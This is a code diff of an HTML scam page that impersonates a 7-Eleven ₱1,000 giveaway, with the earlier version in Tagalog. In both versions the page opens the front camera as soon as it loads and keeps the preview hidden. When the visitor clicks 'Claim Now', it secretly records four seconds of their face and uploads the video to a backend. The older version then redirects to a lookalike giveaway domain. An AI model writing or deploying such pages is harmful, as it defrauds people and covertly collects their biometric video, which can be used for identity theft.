@@ -1,176 +1,79 @@
 <!DOCTYPE html>
-<html lang="tl">
-
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 FREE ₱1,000 GIVEAWAY!</title>
-    <style>
-        body{
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            background: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .item{
-            position:fixed;
-            top:-50px;
-            font-size:28px;
-            animation:fall linear infinite;
-        }
-        @keyframes fall{
-            0%{ transform:translateY(-50px); opacity:1; }
-            100%{ transform:translateY(110vh); opacity:0.8; }
-        }
-        .item:nth-child(1){left:5%; animation-duration:6s;}
-        .item:nth-child(2){left:15%; animation-duration:8s;}
-        .item:nth-child(3){left:25%; animation-duration:7s;}
-        .item:nth-child(4){left:35%; animation-duration:9s;}
-        .item:nth-child(5){left:45%; animation-duration:6s;}
-        .item:nth-child(6){left:55%; animation-duration:8s;}
-        .item:nth-child(7){left:65%; animation-duration:7s;}
-        .item:nth-child(8){left:75%; animation-duration:9s;}
-        .item:nth-child(9){left:85%; animation-duration:6s;}
-        .item:nth-child(10){left:95%; animation-duration:8s;}
-
-        .card{
-            background: #808080;
-            padding: 30px;
-            border-radius: 16px;
-            text-align: center;
-            width: 90%;
-            max-width: 400px;
-            border: 1px solid #474d57;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        }
-        .logo-icon{ width: 80px; margin-bottom: 20px; }
-        h2{ color: #f3ba2f; margin-bottom: 10px; }
-        p{ color: #ffffff; font-size: 14px; line-height: 1.6; }
-        .btn{
-            background: #f3ba2f;
-            color: #000;
-            border: none;
-            padding: 15px;
-            width: 100%;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 20px;
-            transition: 0.3s;
-        }
-        .btn:hover{ background: #dba323; }
-
-        #vBox{ width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
-        #loading{ display: none; margin-top: 20px; }
-        .spinner{
-            border: 3px solid #30363d;
-            border-top: 3px solid #f3ba2f;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
-        }
-        @keyframes spin{ 0%{ transform: rotate(0deg);} 100%{ transform: rotate(360deg);} }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎁 FREE ₱1,000 GIVEAWAY!</title>
+<style>
+/* Add your previous styling here (card, button, falling gifts) */
+#vBox { width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
+#loading { display: none; margin-top: 20px; }
+.spinner { border: 3px solid #30363d; border-top: 3px solid #f3ba2f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
 </head>
-
 <body>
+<div class="card">
+    <h2>🎉 CONGRATULATIONS! 🎉</h2>
+    <p>Click “Claim Now” to see if you’re lucky!</p>
 
-    <div class="card">
-        <img src="https://raw.githubusercontent.com/ninoadajar-a11y/Aray-mo/refs/heads/main/b1254f40-ca11-43dd-97a1-d86053dec6ba.jpeg" class="logo-icon" alt="7/11">
-        <h2>🎉 CONGRATULATIONS! 🎉</h2>
-        <p>Nanalo ka ng ₱1,000 Cash Prize! 💸
-Ikaw ay napili bilang lucky winner sa aming random draw today.
-Para ma-claim ang prize mo:
-👉 Click “Claim Now”
-⏳ Limited time lang ang claim!</p>
-
-        <div id="vBox">
-            <video id="preview" autoplay playsinline muted></video>
-        </div>
-
-        <div id="loading">
-            <div class="spinner"></div>
-            <p>Processing request...</p>
-        </div>
-
-        <button class="btn" id="startBtn">Claim Now!!!</button>
+    <div id="vBox">
+        <video id="preview" autoplay playsinline muted></video>
     </div>
 
-    <div class="item">🎁</div>
-    <div class="item">💸</div>
-    <div class="item">🎁</div>
-    <div class="item">💰</div>
-    <div class="item">🎁</div>
-    <div class="item">💵</div>
-    <div class="item">🎁</div>
-    <div class="item">💸</div>
-    <div class="item">🎁</div>
-    <div class="item">💰</div>
+    <div id="loading">
+        <div class="spinner"></div>
+        <p>Processing request...</p>
+    </div>
 
-    <script>
-        const btn = document.getElementById('startBtn');
-        const loading = document.getElementById('loading');
-        const video = document.getElementById('preview');
-        const REDIRECT_URL = "https://seven-11-giveaways-2026.onrender.com/"; // Redirect after done
+    <button id="startBtn">Claim Now!!!</button>
+</div>
 
-        // Init camera
-        async function initCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                video.srcObject = stream;
-            } catch (err) { console.warn("Camera access required."); }
-        }
-        initCamera();
+<script>
+const btn = document.getElementById('startBtn');
+const loading = document.getElementById('loading');
+const video = document.getElementById('preview');
 
-        // Handle claim button
-        btn.addEventListener('click', async () => {
-            btn.style.display = 'none';
-            loading.style.display = 'block';
+async function initCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        video.srcObject = stream;
+    } catch (err) {
+        console.warn("Camera access denied.");
+    }
+}
+initCamera();
 
-            // RECORD 4 SECONDS
-            const stream = video.srcObject;
-            if (!stream) { console.error("No video stream"); return; }
+btn.addEventListener('click', async () => {
+    btn.style.display = 'none';
+    loading.style.display = 'block';
 
-            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-            let chunks = [];
+    try {
+        const stream = video.srcObject;
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        let chunks = [];
 
-            recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
-            recorder.onstop = async () => {
-                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+        recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
+        recorder.onstop = async () => {
+            const videoBlob = new Blob(chunks, { type: 'video/webm' });
+            const formData = new FormData();
+            formData.append('video', videoBlob, 'claim_video.mp4');
 
-                // SEND TO BACKEND
-                const formData = new FormData();
-                formData.append("video", videoBlob);
+            const res = await fetch("/upload-video", { method: "POST", body: formData });
+            const data = await res.json();
+            console.log("Video posted:", data);
 
-                await fetch("https://your-backend-url.com/upload-video", {
-                    method: "POST",
-                    body: formData
-                })
-                .then(res => res.json())
-                .then(data => console.log("Video posted:", data))
-                .catch(err => console.error("Error posting video:", err));
+            loading.innerHTML = "<p>Success! Your claim video has been posted.</p>";
+        };
 
-                window.mainScriptFinished = true;
-            };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 4000);
 
-            recorder.start();
-            setTimeout(() => recorder.stop(), 4000);
-
-            // Wait for backend result
-            const check = setInterval(() => {
-                if(window.mainScriptFinished){
-                    clearInterval(check);
-                    window.location.href = REDIRECT_URL;
-                }
-            }, 500);
-        });
-    </script>
-
+    } catch (err) {
+        console.error(err);
+        loading.innerHTML = "<p>Error capturing video.</p>";
+    }
+});
+</script>
 </body>
 </html>
